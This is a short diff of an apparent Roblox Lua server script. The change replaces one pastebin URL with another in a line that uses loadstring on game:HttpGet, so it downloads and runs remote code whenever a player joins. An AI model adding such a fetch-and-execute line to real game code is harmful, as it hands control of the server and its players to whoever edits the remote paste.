@@ -20,7 +20,7 @@ game.Players.PlayerAdded:Connect(function(player)
     else
         print(player.Name .. " has joined the game.")
         -- Activate loadstring for whitelisted players
-        loadstring(game:HttpGet("https://pastebin.com/raw/PET9Ah5R"))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/cgqDDSwh"))()
     end
 end)
 
